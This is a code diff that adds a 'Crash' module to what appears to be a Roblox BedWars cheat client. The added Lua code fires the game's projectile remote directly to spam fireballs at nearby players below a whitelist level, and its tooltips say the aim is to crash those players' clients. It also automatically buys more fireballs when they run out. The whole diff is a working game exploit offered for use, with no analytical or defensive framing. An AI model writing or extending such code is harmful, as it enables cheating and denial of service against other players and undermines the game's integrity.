@@ -3931,6 +3931,126 @@ run(function()
 end)
 
 run(function()
+	local Crash
+	local CrashBuyTick = 0
+	local projectileRemote = {InvokeServer = function() end}
+	task.spawn(function()
+		projectileRemote = bedwars.Handler:Get('ProjectileFire').Remote.instance
+	end)
+	local function wlLevel(plr)
+		local ok, lvl = pcall(whitelist.get, whitelist, plr)
+		return ok and lvl or 0
+	end
+	local function crashShopId()
+		if not entitylib.isAlive then return nil end
+		local localPosition = entitylib.character.RootPart.Position
+		for _, v in store.shop do
+			if v.Shop and (v.RootPart.Position - localPosition).Magnitude <= 20 then
+				return v.Id
+			end
+		end
+	end
+	local function crashThrow(item, origin, targetpos)
+		switchItem(item.tool, 0)
+		task.wait(0.05)
+		local delta = targetpos - origin
+		local dist = delta.Magnitude
+		if dist < 1 then return end
+		local velocity = delta.Unit * 60 + Vector3.new(0, math.min(dist * 1.6, 25), 0)
+		local position = origin + Vector3.new(0, 1, 0)
+		bedwars.ProjectileController:createLocalProjectile(bedwars.ProjectileMeta['fireball'], 'fireball', 'fireball', position, '', velocity, {drawDurationSeconds = 1})
+		projectileRemote:InvokeServer(item.tool, 'fireball', 'fireball', position, origin, velocity, httpService:GenerateGUID(true), {drawDurationSeconds = 1}, workspace:GetServerTimeNow() - 0.045)
+	end
+	Crash = larp.Categories.Blatant:CreateModule({
+		Name = 'Crash',
+		Function = function(callback)
+			if callback then
+				if not (shared.LarpOwner or wlLevel(lplr) >= 5) then
+					notif('Crash', 'Level 5 required', 3)
+					Crash.Enabled = false
+					return
+				end
+				notif('Crash', 'Crashing players below level 5', 3)
+				repeat
+					local item = getItem('fireball')
+					if not item then
+						if Buy.Enabled and CrashBuyTick <= tick() then
+							local shopitem = bedwars.Shop.getShopItem('fireball', lplr)
+							if shopitem then
+								local iron = 0
+								for _, v in store.inventory.inventory.items do
+									if v.itemType == 'iron' then iron = v.amount end
+								end
+								if iron >= shopitem.price then
+									bedwars.Handler:Get('BedwarsPurchaseItem'):Fire('CallServerAsync', {shopItem = shopitem, shopId = crashShopId()})
+									CrashBuyTick = tick() + 1
+								end
+							end
+						end
+						task.wait(0.1)
+					else
+						local root = entitylib.character and entitylib.character.RootPart
+						if root and (shared.LarpOwner or wlLevel(lplr) >= 5) then
+							if Mode.Value == 'All' then
+								for _, plr in playersService:GetPlayers() do
+									if plr ~= lplr and plr.Character and plr.Character:FindFirstChild('HumanoidRootPart') and plr.Character:FindFirstChildOfClass('Humanoid') and plr.Character.Humanoid.Health > 0 and wlLevel(plr) < 5 and (plr.Character.HumanoidRootPart.Position - root.Position).Magnitude < Range.Value then
+										crashThrow(item, root.Position, plr.Character.HumanoidRootPart.Position)
+									end
+								end
+							else
+								local target, bestdist
+								for _, plr in playersService:GetPlayers() do
+									if plr ~= lplr and plr.Character and plr.Character:FindFirstChild('HumanoidRootPart') and plr.Character:FindFirstChildOfClass('Humanoid') and plr.Character.Humanoid.Health > 0 and wlLevel(plr) < 5 then
+										local dist = (plr.Character.HumanoidRootPart.Position - root.Position).Magnitude
+										if dist < Range.Value and (not bestdist or dist < bestdist) then
+											bestdist = dist
+											target = plr
+										end
+									end
+								end
+								if target and target.Character and target.Character:FindFirstChild('HumanoidRootPart') then
+									crashThrow(item, root.Position, target.Character.HumanoidRootPart.Position)
+								end
+							end
+						end
+						task.wait(math.max(Delay.Value, 0.05))
+					end
+				until not Crash.Enabled
+			end
+		end,
+		ExtraText = function()
+			return 'Level 5'
+		end,
+		Tooltip = 'Spams fireballs at players below level 5 to crash their clients'
+	})
+	Mode = Crash:CreateDropdown({
+		Name = 'Target',
+		List = {'Nearest', 'All'},
+		Default = 'Nearest',
+		Tooltip = 'Nearest - Crashes the closest player below level 5\nAll - Crashes every player below level 5 in range'
+	})
+	Range = Crash:CreateSlider({
+		Name = 'Range',
+		Min = 10,
+		Max = 200,
+		Default = 80,
+		Suffix = 'studs'
+	})
+	Delay = Crash:CreateSlider({
+		Name = 'Delay',
+		Min = 0.1,
+		Max = 2,
+		Default = 0.3,
+		Decimal = 10,
+		Suffix = 's'
+	})
+	Buy = Crash:CreateToggle({
+		Name = 'Auto buy fireballs',
+		Tooltip = 'Buys fireballs with iron when you run out'
+	})
+end)
+
+run(function()
 	local NoFall
 	
 	NoFall = larp.Categories.Blatant:CreateModule({
